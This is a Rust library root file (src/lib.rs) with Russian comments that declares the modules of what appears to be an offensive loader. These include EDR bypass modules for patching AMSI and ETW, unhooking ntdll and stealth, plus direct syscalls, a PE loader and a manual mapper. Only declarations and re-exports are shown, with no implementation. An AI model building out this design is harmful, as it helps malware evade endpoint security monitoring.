// src/lib.rs

// Основные модули
pub mod utils;
pub mod constants;
pub mod crypto; 
pub mod data;
pub mod syscall;


// EDR bypass модули
pub mod edr {
    pub mod amsi;
    pub mod etw;
    pub mod unhook;
    pub mod stealth;
}

// Memory management модули
pub mod memory {
    pub mod pe_loader;
    pub mod manual_map;
}

// Re-export для прямого доступа из main.rs
pub use utils::*;
pub use data::*;

// EDR функции
pub use edr::amsi::patch_amsi;
pub use edr::etw::patch_etw;
pub use edr::unhook::unhook_ntdll;

// Memory типы
pub use memory::pe_loader::PELoader;
pub use memory::manual_map::ManualMapper;
